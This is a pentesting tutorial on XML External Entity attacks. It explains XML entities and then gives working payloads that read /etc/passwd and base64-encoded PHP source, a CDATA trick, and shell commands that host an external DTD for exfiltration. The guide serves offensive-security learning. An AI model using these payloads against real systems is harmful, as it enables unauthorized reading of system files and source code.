# XXE - XEE - XML External Entity

An XML External Entity attack is a type of attack against an application that parses XML input.

## XML Basics

Most of this part was taken from this amazing Portswigger page: https://portswigger.net/web-security/xxe/xml-entities
https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity

## What is XML?

XML stands for "extensible markup language". XML is a language designed for storing and transporting data. Like HTML, XML uses a tree-like structure of tags and data. Unlike HTML, XML does not use predefined tags, and so tags can be given names that describe the data. Earlier in the web's history, XML was in vogue as a data transport format (the "X" in "AJAX" stands for "XML"). But its popularity has now declined in favor of the JSON format.

## What are XML entities?

XML entities are a way of representing an item of data within an XML document, instead of using the data itself. Various entities are built in to the specification of the XML language. For example, the entities &lt; and &gt; represent the characters < and >. These are metacharacters used to denote XML tags, and so must generally be represented using their entities when they appear within data.

## What are XML elements?

Element type declarations set the rules for the type and number of elements that may appear in an XML document, what elements may appear inside each other, and what order they must appear in. For example:
<!ELEMENT stockCheck ANY> Means that any object could be inside the parent <stockCheck></stockCheck>
<!ELEMENT stockCheck EMPTY> Means that it should be empty <stockCheck></stockCheck>
<!ELEMENT stockCheck (productId,storeId)> Declares that <stockCheck> can have the children <productId> and <storeId>

## What are XML external entities?

XML external entities are a type of custom entity whose definition is located outside of the DTD where they are declared.
The declaration of an external entity uses the SYSTEM keyword and must specify a URL from which the value of the entity should be loaded. For example:
	<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>
The URL can use the file:// protocol, and so external entities can be loaded from file. For example:
	<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>
XML external entities provide the primary means by which XML external entity attacks arise.


## Identifyind XXE

The first step in identifying potential XXE vulnerabilities is finding web pages that accept an XML user input. Suppose the web application uses outdated XML libraries, and it does not apply any filters or sanitization on our XML input. In that case, we may be able to exploit this XML form to read local files.

Some web applications may default to a JSON format in HTTP request, but may still accept other formats, including XML. So, even if a web app sends requests in a JSON format, we can try changing the Content-Type header to application/xml, and then convert the JSON data to XML with an online tool. If the web application does accept the request with XML data, then we may also test it against XXE vulnerabilities, which may reveal an unanticipated XXE vulnerability.

For example we can define a xml entity:

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```
or

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

Then send it as input:

```xml
<email>&company;</email>
```

## With CDATA

To output data that does not conform to the XML format, we can wrap the content of the external file reference with a CDATA tag (e.g. <![CDATA[ FILE_CONTENT ]]>). This way, the XML parser would consider this part raw data, which may contain any type of data, including any special characters.

Example:

```xml
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
```

Then we a dtd file with the joined ententiy:

```shell
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
python3 -m http.server 8000
```

Finally we send our data as:

```xml
<email>&joined;</email>
```

## Automation

Use https://github.com/AndreMIsidoro/tools/tree/master/xxe_injector